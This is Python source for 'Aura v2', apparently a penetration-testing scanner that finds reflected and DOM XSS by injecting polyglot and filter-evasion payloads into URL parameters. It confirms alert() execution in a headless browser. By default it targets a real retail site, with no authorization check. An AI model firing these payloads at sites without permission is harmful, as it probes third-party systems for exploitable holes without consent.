"""
Aura v2 — XSS (Cross-Site Scripting) Detection Engine
=======================================================
Detects Reflected, DOM, and Stored XSS vulnerabilities using:
  - A curated set of polyglot XSS payloads
  - Playwright headless browser for real execution detection
  - alert() / prompt() dialog interception
  - DOM sink scanning (innerHTML, document.write, eval)

Why Playwright and not regex?
Because the only reliable way to confirm XSS is to actually
execute JavaScript in a real browser. WAFs strip obvious <script> tags
but polyglot payloads bypass most filters. We detect execution via
the browser's dialog event, not by parsing HTML.

Usage:
    aura www.target.com --xss
    aura www.target.com --xss --map reports/discovery_map_target.json
"""

import asyncio
import json
import os
import re
import urllib.parse
from datetime import datetime
from pathlib import Path
from typing import Optional

import httpx

try:
    from playwright.async_api import async_playwright, Page, Dialog
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    print("[XSS] Playwright not installed — using httpx reflection mode only")


# ─── XSS Payload Arsenal ──────────────────────────────────────────────────────
# Ordered from most bypassing to most obvious
XSS_PAYLOADS = [
    # Polyglots (bypass most WAFs and filters)
    '"><svg/onload=alert(1)>',
    "'-alert(1)-'",
    '"><img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    # JavaScript protocol
    "javascript:alert(1)",
    # HTML5 event handlers
    '<body onload=alert(1)>',
    '<iframe onload=alert(1)>',
    # Template injection style
    '{{7*7}}',       # Detect SSTI alongside XSS
    '${alert(1)}',   # JS template literal
    # Filter evasion
    '<ScRiPt>alert(1)</sCrIpT>',
    '<img src="x" onerror="alert(1)">',
    # The GOAT polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\x3e",
]

# Unique marker to identify our injection
XSS_MARKER = "AURA_XSS_DETECTED_777"
MARKED_PAYLOADS = [
    f'"><svg/onload=alert("{XSS_MARKER}")>',
    f"'-alert('{XSS_MARKER}')-'",
    f'"><img src=x onerror=alert("{XSS_MARKER}")>',
    f'"><script>alert("{XSS_MARKER}")</script>',
]

SKIP_PARAMS = {"page", "sort", "order", "lang", "locale", "currency", "format"}
SKIP_EXTENSIONS = re.compile(r'\.(css|js|png|jpg|gif|svg|ico|woff|ttf|webp)$', re.I)


class XSSEngine:
    """
    Playwright-powered XSS detection engine.
    Injects payloads into URL parameters and detects real execution.
    """

    def __init__(
        self,
        target: str,
        cookies_str: str,
        output_dir: str = "./reports",
        timeout_ms: int = 8000,
        headless: bool = True,
    ):
        if not target.startswith("http"):
            target = "https://" + target
        self.target = target.rstrip("/")
        self.target_domain = urllib.parse.urlparse(self.target).netloc
        self.cookies_str = cookies_str
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.timeout_ms = timeout_ms
        self.headless = headless

        self.findings: list[dict] = []
        self.tested: set[str] = set()

    @staticmethod
    def _parse_cookies(cookie_str: str, domain: str) -> list[dict]:
        cookies = []
        for part in cookie_str.split(";"):
            part = part.strip()
            if "=" in part:
                k, _, v = part.partition("=")
                cookies.append({"name": k.strip(), "value": v.strip(),
                                 "domain": domain, "path": "/"})
        return cookies

    def _extract_injectable_urls(self, discovery_map: dict) -> list[dict]:
        """
        Extracts URLs with injectable parameters from the discovery map.
        Returns list of {url, param, original_value} dicts.
        """
        injectable = []
        all_calls = discovery_map.get("all_api_calls", [])
        idor_candidates = discovery_map.get("idor_candidates", [])

        all_urls = [c["url"] for c in all_calls + idor_candidates]

        for url in all_urls:
            if SKIP_EXTENSIONS.search(url):
                continue
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

            for param_name, values in params.items():
                if param_name.lower() in SKIP_PARAMS:
                    continue
                original_val = values[0] if values else ""
                # String params are more likely to reflect
                if not original_val.isdigit():
                    injectable.append({
                        "url": url,
                        "param": param_name,
                        "original_value": original_val,
                        "parsed": parsed,
                    })

        # Also add target homepage with common test params
        test_paths = [
            f"{self.target}/search?q=AURA_TEST",
            f"{self.target}/?search=AURA_TEST",
            f"{self.target}/?q=AURA_TEST",
            f"{self.target}/products?name=AURA_TEST",
            f"{self.target}/?keyword=AURA_TEST",
            f"{self.target}/?cat=AURA_TEST",
            f"{self.target}/results?query=AURA_TEST",
            f"{self.target}/?s=AURA_TEST",
        ]
        for path in test_paths:
            p = urllib.parse.urlparse(path)
            params = urllib.parse.parse_qs(p.query)
            for param_name, values in params.items():
                injectable.append({
                    "url": path,
                    "param": param_name,
                    "original_value": values[0],
                    "parsed": p,
                })

        # Deduplicate by (url_base, param)
        seen = set()
        unique = []
        for item in injectable:
            key = (item["parsed"].path, item["param"])
            if key not in seen:
                seen.add(key)
                unique.append(item)

        return unique

    def _discover_urls_from_sitemap(self) -> list[dict]:
        """
        Tries to discover injectable URLs from sitemap.xml and robots.txt.
        Falls back to crawling <a href> links on the homepage.
        Works WITHOUT a pre-existing discovery map.
        """
        discovered_urls = []
        seen_paths = set()

        # Try sitemap.xml
        for sitemap_url in [f"{self.target}/sitemap.xml", f"{self.target}/sitemap_index.xml"]:
            try:
                r = httpx.get(sitemap_url, timeout=8, verify=False,
                              headers={"User-Agent": "Mozilla/5.0"}, follow_redirects=True)
                if r.status_code == 200:
                    locs = re.findall(r'<loc>([^<]+)</loc>', r.text)
                    for loc in locs:
                        parsed = urllib.parse.urlparse(loc)
                        if self.target_domain not in parsed.netloc:
                            continue
                        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                        for pname, vals in params.items():
                            if pname.lower() in SKIP_PARAMS:
                                continue
                            if not vals[0].isdigit():  # Only text params
                                key = (parsed.path, pname)
                                if key not in seen_paths:
                                    seen_paths.add(key)
                                    discovered_urls.append({
                                        "url": loc, "param": pname,
                                        "original_value": vals[0], "parsed": parsed
                                    })
            except Exception:
                continue

        # Crawl homepage links if sitemap empty
        if not discovered_urls:
            try:
                r = httpx.get(self.target, timeout=10, verify=False,
                              headers={"User-Agent": "Mozilla/5.0"}, follow_redirects=True)
                hrefs = re.findall(r'href=["\']([^"\'>]+\?[^"\'>]+)["\']', r.text)
                for href in hrefs[:50]:
                    if href.startswith("/"):
                        href = self.target + href
                    elif not href.startswith("http"):
                        continue
                    parsed = urllib.parse.urlparse(href)
                    if self.target_domain not in parsed.netloc:
                        continue
                    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    for pname, vals in params.items():
                        if pname.lower() in SKIP_PARAMS:
                            continue
                        key = (parsed.path, pname)
                        if key not in seen_paths:
                            seen_paths.add(key)
                            discovered_urls.append({
                                "url": href, "param": pname,
                                "original_value": vals[0], "parsed": parsed
                            })
            except Exception:
                pass

        return discovered_urls

    def _httpx_reflection_check(self, url: str, param: str, original_value: str) -> Optional[dict]:
        """
        Fast httpx-based XSS reflection check (NO browser required).
        Injects a unique marker and checks if it appears in the raw HTML response.
        Not a confirmed XSS (just reflection), but guides Playwright for real confirmation.
        """
        marker = "AuraXssMarker7x7"
        test_payloads = [
            f'">{marker}<svg',
            f"'>{{{{marker}}}}",
            f"{marker}<img src=x>",
            marker,  # Bare marker to detect any reflection
        ]

        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        for payload in test_payloads:
            params[param] = [payload]
            new_query = urllib.parse.urlencode(params, doseq=True)
            test_url = parsed._replace(query=new_query).geturl()

            try:
                r = httpx.get(test_url, timeout=8, verify=False,
                              headers={"User-Agent": "Mozilla/5.0"},
                              cookies={k: v for k, v in
                                       [p.split("=", 1) for p in self.cookies_str.split(";")
                                        if "=" in p]},
                              follow_redirects=True)
                if marker in r.text:
                    # Check if it's reflected unencoded (potential XSS)
                    raw_reflected = marker in r.text and "&lt;" not in r.text
                    return {
                        "type": "Reflected XSS (Unconfirmed — HTML Reflection)",
                        "url": url,
                        "injected_url": test_url,
                        "param": param,
                        "payload": payload,
                        "reflected": True,
                        "encoded": not raw_reflected,
                        "severity": "HIGH" if raw_reflected else "INFO",
                        "cvss_score": 7.4 if raw_reflected else 0,
                        "note": "Marker reflected unencoded — confirm with Playwright or manual browser test" if raw_reflected else "Marker reflected but HTML-encoded — lower risk",
                        "owasp": "A03:2021 — Injection",
                        "timestamp": datetime.utcnow().isoformat(),
                    }
            except Exception:
                continue
        return None

    async def _test_injection(
        self,
        page: Page,
        target_info: dict,
        payload: str,
    ) -> Optional[dict]:
        """
        Navigates to a URL with injected payload and checks for alert() execution.
        Returns a finding dict if XSS is confirmed.
        """
        # Build injected URL
        parsed = target_info["parsed"]
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[target_info["param"]] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        injected_url = parsed._replace(query=new_query).geturl()

        dedup_key = f"{target_info['param']}:{payload[:30]}"
        if dedup_key in self.tested:
            return None
        self.tested.add(dedup_key)

        xss_fired = {"detected": False, "message": ""}

        async def handle_dialog(dialog: Dialog):
            msg = dialog.message
            if XSS_MARKER in msg or str(msg).strip() in ("1", "true", "undefined"):
                xss_fired["detected"] = True
                xss_fired["message"] = msg
            await dialog.dismiss()

        page.on("dialog", handle_dialog)

        try:
            await page.goto(injected_url, timeout=self.timeout_ms, wait_until="domcontentloaded")
            await page.wait_for_timeout(1500)  # Let JS execute
        except Exception:
            pass

        page.remove_listener("dialog", handle_dialog)

        if xss_fired["detected"]:
            return {
                "type": "Reflected XSS",
                "url": target_info["url"],
                "injected_url": injected_url,
                "param": target_info["param"],
                "payload": payload,
                "dialog_message": xss_fired["message"],
                "severity": "HIGH",
                "cvss_score": 7.4,
                "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
                "owasp": "A03:2021 — Injection",
                "timestamp": datetime.utcnow().isoformat(),
            }
        return None

    async def _scan_dom_sinks(self, page: Page, url: str) -> list[dict]:
        """
        Scans page JavaScript for dangerous DOM sinks.
        Detects: innerHTML, document.write, eval, location.href with user input.
        """
        findings = []
        try:
            await page.goto(url, timeout=self.timeout_ms, wait_until="domcontentloaded")

            # Check for common DOM XSS sinks in page scripts
            dom_findings = await page.evaluate("""
                () => {
                    const results = [];
                    const scripts = [...document.querySelectorAll('script')];
                    const dangerousSinks = [
                        'innerHTML', 'outerHTML', 'document.write',
                        'eval(', 'setTimeout(', 'setInterval(',
                        'location.href', 'location.hash', 'location.search'
                    ];
                    const urlSources = ['location.hash', 'location.search', 'location.href',
                                        'document.URL', 'document.referrer', 'window.name'];

                    for (const script of scripts) {
                        const src = script.textContent || '';
                        for (const sink of dangerousSinks) {
                            if (src.includes(sink)) {
                                for (const source of urlSources) {
                                    if (src.includes(source)) {
                                        results.push({sink, source, snippet: src.substring(
                                            Math.max(0, src.indexOf(sink) - 50),
                                            src.indexOf(sink) + 80
                                        ).trim()});
                                    }
                                }
                            }
                        }
                    }
                    return results;
                }
            """)

            for sink_info in (dom_findings or []):
                findings.append({
                    "type": "DOM XSS Sink",
                    "url": url,
                    "sink": sink_info.get("sink"),
                    "source": sink_info.get("source"),
                    "snippet": sink_info.get("snippet", ""),
                    "severity": "MEDIUM",
                    "cvss_score": 6.1,
                    "owasp": "A03:2021 — Injection",
                    "note": "Manual verification required — sink detected but not confirmed exploitable",
                    "timestamp": datetime.utcnow().isoformat(),
                })

        except Exception:
            pass
        return findings

    async def run(self, discovery_map: Optional[dict] = None) -> list[dict]:
        """Main async XSS scan runner."""
        # Step 1: Extract injectable URLs from discovery map (if available)
        injectable_urls = []
        if discovery_map:
            injectable_urls = self._extract_injectable_urls(discovery_map)

        # Step 2: If no injection points from map, try sitemap/homepage discovery
        if not injectable_urls:
            print("\n🔰 No discovery map provided — running Sitemap/Homepage URL Discovery...")
            injectable_urls = self._discover_urls_from_sitemap()
            if injectable_urls:
                print(f"   ✅ Discovered {len(injectable_urls)} injectable URL(s) from sitemap/homepage")
            else:
                # Last resort: use common test params on target
                print("   ⚠️  No injectable URLs found from sitemap either.")
                print("   🔰 Falling back to common parameter probes...")
                injectable_urls = self._extract_injectable_urls({})

        meta = discovery_map.get("meta", {}) if discovery_map else {}

        print(f"\n{'='*65}")
        print(f"🟡 AURA v2 — XSS Detection Engine")
        print(f"🎯 Target: {meta.get('target', self.target)}")
        print(f"💩 Injectable Parameters Found: {len(injectable_urls)}")
        print(f"🔫 Payloads per Parameter: {len(MARKED_PAYLOADS)}")
        print(f"{'='*65}")

        # Phase 1: Fast httpx reflection check (no browser needed)
        print(f"\n⚡ Phase 1: HTTP Reflection Check ({ len(injectable_urls)} params)...")
        reflection_hits = []
        for target_info in injectable_urls:
            result = self._httpx_reflection_check(
                target_info["url"], target_info["param"], target_info["original_value"]
            )
            if result:
                if result["severity"] in ("HIGH", "MEDIUM"):
                    print(f"  🚨 REFLECTION: [{target_info['param']}] in {target_info['url'][:70]}")
                    print(f"     Note: {result['note']}")
                    self.findings.append(result)
                    reflection_hits.append(target_info)
                else:
                    print(f"  ⚠️  Encoded reflection: [{target_info['param']}] (HTML-encoded, lower risk)")

        # Phase 2: Playwright confirmation on reflection hits (if available)
        if not PLAYWRIGHT_AVAILABLE:
            print(f"\n⚠️  Playwright not installed — skipping browser-based XSS confirmation.")
            print("   Install: pip install playwright && playwright install chromium")
            print(f"   📊 {len(reflection_hits)} URL(s) need manual browser confirmation.")
            return self._finalize()

        async with async_playwright() as pw:
            browser = await pw.chromium.launch(headless=self.headless)
            context = await browser.new_context(
                ignore_https_errors=True,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            )

            # Inject session cookies
            cookies = self._parse_cookies(self.cookies_str, self.target_domain)
            if cookies:
                await context.add_cookies(cookies)

            # Scan DOM sinks on key pages
            print("\n🔍 Phase 2: DOM Sink Analysis...")
            dom_page = await context.new_page()
            key_pages = [self.target, f"{self.target}/search", f"{self.target}/products"]
            for kp in key_pages:
                dom_findings = await self._scan_dom_sinks(dom_page, kp)
                for df in dom_findings:
                    print(f"  ⚠️  DOM Sink [{df['sink']}] ← [{df['source']}] on {kp}")
                    self.findings.append(df)
            await dom_page.close()

            # Phase 3: Playwright confirmation on reflection hits first, then all injectable
            all_to_test = reflection_hits or injectable_urls
            print(f"\n💩 Phase 3: Browser XSS Confirmation ({len(all_to_test)} targets)...")
            page = await context.new_page()

            for target_info in all_to_test:
                print(f"\n  🎯 [{target_info['param']}] in {target_info['url'][:70]}")
                confirmed = False
                for payload in MARKED_PAYLOADS:
                    if confirmed:
                        break
                    finding = await self._test_injection(page, target_info, payload)
                    if finding:
                        print(f"     🚨 XSS CONFIRMED! Payload: {payload[:50]}")
                        self.findings.append(finding)
                        confirmed = True
                if not confirmed:
                    print(f"     ✅ No XSS confirmed on this parameter")

            await page.close()
            await browser.close()

        return self._finalize()

    def _finalize(self) -> list[dict]:
        """Saves findings and prints summary."""
        xss_confirmed = [f for f in self.findings if f.get("type") == "Reflected XSS"]
        dom_sinks = [f for f in self.findings if f.get("type") == "DOM XSS Sink"]

        print(f"\n{'='*65}")
        print(f"✅ XSS SCAN COMPLETE")
        print(f"{'='*65}")
        print(f"  🚨 Reflected XSS Confirmed : {len(xss_confirmed)}")
        print(f"  ⚠️  DOM XSS Sinks Found    : {len(dom_sinks)}")

        if self.findings:
            for i, f in enumerate(xss_confirmed, 1):
                print(f"\n  [{i}] {f['type']} — param: {f['param']}")
                print(f"       URL: {f['injected_url'][:80]}")
                print(f"       Payload: {f['payload'][:60]}")
                print(f"       Severity: {f['severity']} | CVSS: {f['cvss_score']}")

            target_slug = self.target_domain.replace(".", "_").replace("www_", "")
            out_path = self.output_dir / f"xss_findings_{target_slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(out_path, "w", encoding="utf-8") as f:
                json.dump({"target": self.target, "findings": self.findings}, f, indent=2)
            print(f"\n  💾 Findings saved: {out_path}")
        else:
            print("\n  ✅ No XSS vulnerabilities confirmed.")

        return self.findings


def run_xss_scan(
    target: str,
    discovery_map_path: Optional[str] = None,
    headless: bool = True,
) -> list[dict]:
    """CLI runner for `aura <target> --xss`."""
    from dotenv import load_dotenv
    load_dotenv()

    cookies_str = os.getenv("AUTH_TOKEN_ATTACKER", "")
    if not cookies_str:
        print("⚠️  AUTH_TOKEN_ATTACKER not set — running unauthenticated XSS scan.")

    # Auto-detect discovery map (optional — engine will self-discover URLs)
    discovery_map = None
    if not discovery_map_path:
        target_slug = target.replace("www.", "").replace(".", "_")
        candidate = Path(f"./reports/discovery_map_{target_slug}.json")
        if candidate.exists():
            discovery_map_path = str(candidate)

    if discovery_map_path:
        try:
            with open(discovery_map_path, encoding="utf-8-sig") as f:
                discovery_map = json.load(f)
        except Exception:
            discovery_map = None

    engine = XSSEngine(target=target, cookies_str=cookies_str, headless=headless)
    return asyncio.run(engine.run(discovery_map))


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "www.iciparisxl.nl"
    run_xss_scan(target)
